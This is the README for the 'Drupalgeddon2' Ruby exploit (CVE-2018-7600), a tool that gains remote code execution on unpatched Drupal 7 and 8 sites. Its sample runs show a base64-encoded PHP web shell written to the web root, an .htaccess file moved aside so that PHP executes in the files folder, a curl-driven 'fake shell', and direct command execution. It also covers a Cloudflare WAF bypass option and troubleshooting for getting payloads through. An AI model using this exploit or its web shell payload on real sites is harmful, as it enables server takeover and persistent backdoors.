# CVE-2018-7600 | Drupal 8.5.x < 8.5.1 / 8.4.x < 8.4.6 / 8.x < 8.3.9 / 7.x? < 7.58 / < 6.x? - 'Drupalgeddon2' RCE (SA-CORE-2018-002)

[Drupalggedon2 ~ https://github.com/dreadlocked/Drupalgeddon2/](https://github.com/dreadlocked/Drupalgeddon2/) _([https://www.drupal.org/sa-core-2018-002](https://www.drupal.org/sa-core-2018-002))_

Supports:
- Drupal **< 8.3.9** / **< 8.4.6** / **< 8.5.1** ~ `user/register` URL, attacking `account/mail` & `#post_render` parameter, using PHP's `passthru` function
- Drupal **< 7.58** ~ `user/password` URL, attacking `triggering_element_name` form & `#post_render` parameter, using PHP's `passthru` function
- Works with **direct commands** (aka File-Less Method) or writes a **PHP shell** to the web root (`./`) or sub-directories (`./sites/default/` & `./sites/default/files/`)
- Support **Linux** & **Windows** targets
- **Auto detects Drupal version** _(or takes a good guess!)_

The `user/register` method was chosen for Drupal v8.x, as it will return `HTTP 200`, and render the output in the `data` JSON response _(un-comment the code for `timezone`/`#lazy_builder` method, which will return `HTTP 500` & blind!)_ _([More Information](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708))_

Authors:
- [Hans Topo](https://github.com/dreadlocked)  _([@\_dreadlocked](https://twitter.com/_dreadlocked))_
- [g0tmi1k](https://blog.g0tmi1k.com/) _([@g0tmi1k](https://twitter.com/g0tmi1k))_

Notes:
- For advance users/setups there is a more customizable exploit. See the `drupalgeddon2-customizable-beta.rb` section
- Before opening an issue, please, read the troubleshooting section at the end. Thanks!


- - -


## Usage:

```bash
$ ruby drupalgeddon2.rb
Usage: ruby drupalggedon2.rb <target> [--verbose] [--authentication]
       ruby drupalgeddon2.rb https://example.com
$
```
The `--verbose` and `--authentication` parameter can be added in any order after <target> 
and they are both optional.
If `--authentication` is specified then you will be prompted with a request to submit
* username, 
* password, 
* form field name for username, 
* form field name for password,
* URL path to the web login page, e.g., `user/login`
* eventual suffix to append after the credentials in the form submission, e.g., form_id, etc.

This is to support exploiting websites that first require POST-based web login and who 
respond with a session cookie, upon successful authentication.


### Drupal v8.x Example

_Drupal v8.x < v8.3.9 / v8.4.x < v8.4.6 / v8.5.x < v8.5.1_

```bash
$ ./drupalgeddon2.rb http://localhost/drupal-8/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://localhost/drupal-8/
--------------------------------------------------------------------------------
[!] MISSING: http://localhost/drupal-8/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://localhost/drupal-8/core/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal?: v8.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[i] Payload: echo TTTBJJBP
[+] Result : TTTBJJBP
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Writing To Web Root (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake shell:   curl 'http://localhost/drupal-8/s.php' -d 'c=hostname'
ubuntu140045x64-drupal>> uname -a
Linux ubuntu140045x64-drupal 3.13.0-144-generic #193-Ubuntu SMP Thu Mar 15 17:03:53 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
ubuntu140045x64-drupal>>
```


### Drupal v7.x Example

_Drupal < v7.58_

```bash
$ ./drupalgeddon2.rb http://localhost/drupal-7/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://localhost/drupal-7/
--------------------------------------------------------------------------------
[+] Found  : http://localhost/drupal-7/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.31
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[i] Payload: echo TKYPVVJJ
[+] Result : TKYPVVJJ
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Writing To Web Root (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake shell:   curl 'http://localhost/drupal-7/s.php' -d 'c=hostname'

ubuntu140045x64-drupal>> uptime
 14:52:33 up 4 days,  3:35,  1 user,  load average: 0.00, 0.01, 0.05
ubuntu140045x64-drupal>>
```


#### Direct Commands / Non PHP Shell (aka File-Less Method)

If either you do not want to even try and write a PHP web shell to the web server, edit the file as shown _(it will fall back if it can't find a writeable location anyway)_:

```ruby
try_phpshelltryphpshell = false
```

**Example**

```bash
$ ./drupalgeddon2.rb http://localhost/drupal-nonwrite/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://localhost/drupal-nonwrite/
--------------------------------------------------------------------------------
[!] MISSING: http://localhost/drupal-nonwrite/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://localhost/drupal-nonwrite/core/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal?: v8.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[i] Payload: echo HYCBAIET
[+] Result : HYCBAIET
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Writing To Web Root (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[!] Target is NOT exploitable for some reason [2] (HTTP Response: 404)...    Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[!] Target is NOT exploitable for some reason [2] (HTTP Response: 404)...    Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[!] Target is NOT exploitable for some reason [1] (HTTP Response: 403)...    May not be able to execute PHP from here?
[!] FAILED: Couldn't find writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct commands
drupalgeddon2>> lsb_release -a
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty
drupalgeddon2>>
```


#### Proxy Support

For proxy support _(e.g. Burp)_, edit the file, replacing with your values. Example:

```ruby
proxy_addr = "192.168.0.130"
proxy_port = 8080
```


- - -


#### Experimental but usable: drupalgeddon2-customizable-beta.rb

`drupalgeddon2-customizable-beta.rb` is intended for more advance users as its more customizable. It allows you to specify some more parameters as the PHP method to use (not only `system()` or `passthru()`) and the way to reach user/password form.

Usage examples:

```
Usage example: ./drupalgeddon-customizable-beta.rb -u http://example.com/ -v 7 -c id
More info: -h
    -u, --url URL                    [Required] Service URL
    -v, --version VERSION            [Required] Target Drupal version {7,8}
    -c, --command COMMAND            [Required] Command to execute
    -m, --method PHP_METHOD          [Optional] PHP Method to use, by default: passthru
        --form                       [Optional] Form to attack, by default '/user/password' in Drupal 7 and '/user/register' in Drupal 8
        --cloudflare                 [Optional] Tries to bypass Cloudflare using Lua-Nginx +100 parameters WAF Bypass
    -h, --help                       Prints this help
```


- - -


## Troubleshooting:

- Whenever getting a _cannot load such file_ "LoadError" type of error, do run `sudo gem install <missing dependency>`.
In particular, you may need to install the _highline_ dependency with `sudo gem install highline`

- The target may redirect to another path, where Drupal exists (such as `HTTP 30x` responses)
    - Solution: Make sure you are using the correct Drupal path

- There is a limitations of a allowed characters that are able to be used in the payload/command
    - Solution: This is due to how the vulnerability sees them and them being encoded for the URL request. Encode the payload, decode it on the target. Such as base64

- If the target is Linux, and isn't using "GNU base64", it may be the BSD version _(or its not installed all together!)_
    - Solution: which to `base64 -D` (rather than `base64 -d`) or use the file-less method

- If the target using Windows, writing the PHP shell always fails
    - Solution: Use file-less method. This is because gets pipe to a unix program, rather than using `certutil` or `PowerShell`

- Drupal v8.x - `./.htaccess` will stop any PHP scripts from executing in `./sites/default/` if that is the writeable folder
    - Solution: Switch to the file-less method

- Drupal v8.x - "clean URL" isn't enabled on the target
    - Solution: N/A - Not vulnerable =(

- Drupal v7.x - If the `/user/password` form is disabled, you meed find another form _(remember to change the exploit!)_
    - Solution: `form_id` parameter will change depending on the form used to exploit the vulnerability


- - -


## Links:

- Drupal SA-CORE-2018-002 Advisory ~ https://www.drupal.org/sa-core-2018-002
- CVE ~ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600
- Write up & Research ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
- cURL commands/sample PoC ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
